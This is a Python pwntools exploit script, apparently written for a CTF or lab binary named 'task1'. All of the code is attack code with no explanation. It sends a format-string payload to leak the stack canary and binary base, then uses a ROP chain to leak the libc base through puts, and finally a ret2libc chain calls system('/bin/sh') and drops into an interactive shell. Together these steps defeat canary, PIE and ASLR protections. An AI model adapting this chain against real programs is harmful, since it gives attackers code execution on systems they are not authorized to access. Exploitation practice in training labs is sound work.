from pwn import *
from pwn import p64,u64

# ====================================================================================

context.log_level = 'error'
pros = process("./task1")
elf = ELF("./task1")
rop = ROP("./task1")
libc_elf = ELF("/lib/x86_64-linux-gnu/libc.so.6")

# ====================================================================================

payload = b"%31$p.%39$p."
pros.sendline(payload)

# PART 1 ( BINARY BASE ADDRESS LIKAGE )

pros.recvline()
leaks = pros.recvline()

canary = int(leaks.split(b".")[0],16)
start = int(leaks.split(b".")[1],16)

print(" Stack Canary Value    : " , hex(canary))
print("_Start Address         : " , hex(start))

binary_base_address = start - elf.symbols["_start"]
print(" Binary Base Address   : " , hex(binary_base_address))

# ====================================================================================

rdi_addr = binary_base_address + rop.find_gadget(["pop rdi","ret"]).address
ret_addr = binary_base_address + rop.find_gadget(["ret"]).address
main_addr = binary_base_address + elf.symbols["main"]
puts_plt = binary_base_address + elf.symbols["puts"]
puts_got = binary_base_address + elf.got["puts"]

# ====================================================================================

junk = b"A" * 40  

# PART 2 ( LIBC BASE ADDRESS LIKAGE )

payload = junk
payload += p64(canary)
payload += b"A" * 8
payload += p64(rdi_addr)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_addr)

pros.sendline(payload)

puts_addr = u64(pros.recvline().strip().ljust(8,b"\x00"))
print(" Puts Absolute Address : ",hex(puts_addr))

libc_base_address = puts_addr - libc_elf.symbols["puts"]
print(" Libc Base Address     : ",hex(libc_base_address))

# ====================================================================================

# PART 3 ( CALLING LIBRARY FUNCTION (SYSTEM) TO POP-UP SHELL )

sh_addr = libc_base_address + next(libc_elf.search(b"/bin/sh"))
system_addr = libc_base_address + libc_elf.symbols["system"]
exit_addr = libc_base_address + libc_elf.symbols["exit"]

payload = junk
payload += p64(canary)
payload += b"A" * 8
payload += p64(rdi_addr)
payload += p64(sh_addr)
payload += p64(ret_addr)
payload += p64(system_addr)
payload += p64(exit_addr)

pros.sendline(payload)
pros.recvlines(2)

pros.interactive()

# ====================================================================================